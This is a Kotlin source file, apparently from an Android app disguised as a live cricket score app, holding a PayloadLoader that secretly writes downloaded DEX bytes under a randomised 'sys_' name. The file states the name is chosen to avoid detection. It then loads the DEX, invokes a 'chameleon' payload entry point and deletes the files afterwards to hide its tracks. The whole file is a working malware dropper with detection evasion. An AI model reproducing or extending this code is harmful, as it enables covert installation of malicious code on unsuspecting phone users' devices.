package com.cricket.livescore.payload

import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.File

object PayloadLoader {
    const val TAG = "PayloadLoader"

    fun loadDex(context: Context, dexBytes: ByteArray) {
        try {
            // Write DEX to internal storage (temporary, will be deleted)
            val dexDir = File(context.filesDir, "updates")
            if (!dexDir.exists()) dexDir.mkdirs()

            // Use a random name to avoid pattern detection
            val randomName = "sys_${System.currentTimeMillis()}.dex"
            val dexFile = File(dexDir, randomName)

            dexFile.writeBytes(dexBytes)

            // Optimized directory for DEX
            val optDir = File(context.codeCacheDir, "opt")
            if (!optDir.exists()) optDir.mkdirs()

            // Load the DEX using DexClassLoader
            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                optDir.absolutePath,
                null,
                context.classLoader
            )

            // Find and invoke the main entry point
            @Suppress("SwallowedException")
            try {
                val entryClass = classLoader.loadClass("com.chameleon.payload.PayloadEntry")
                val entryMethod = entryClass.getDeclaredMethod("start", Context::class.java)
                entryMethod.invoke(null, context)
                Log.i(TAG, "Payload entry point invoked successfully")
            } catch (e: ClassNotFoundException) {
                // Try alternative entry point
                try {
                    val entryClass = classLoader.loadClass("PayloadEntry")
                    val entryMethod = entryClass.getDeclaredMethod("start", Context::class.java)
                    entryMethod.invoke(null, context)
                    Log.i(TAG, "Payload entry (alt) invoked")
                } catch (e2: Exception) {
                    Log.e(TAG, "Could not find payload entry point", e2)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to invoke payload entry point", e)
            }

            // Schedule deletion of the DEX file (cleanup)
            scheduleDexDeletion(dexFile)
            Log.i(TAG, "DEX loaded from: $randomName")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load DEX", e)
        }
    }

    private fun scheduleDexDeletion(dexFile: File) {
        Thread {
            try {
                // Wait a few minutes before deleting (payload needs to initialize)
                Thread.sleep(120000)

                if (dexFile.exists()) {
                    dexFile.delete()
                    Log.i(TAG, "DEX file deleted: ${dexFile.name}")
                }

                // Also clean the opt directory
                val optDir = dexFile.parentFile?.let { File(it.parentFile, "opt") }
                optDir?.listFiles()?.forEach { file ->
                    if (file.name.startsWith("sys_")) {
                        file.delete()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to delete DEX", e)
            }
        }.start()
    }
}
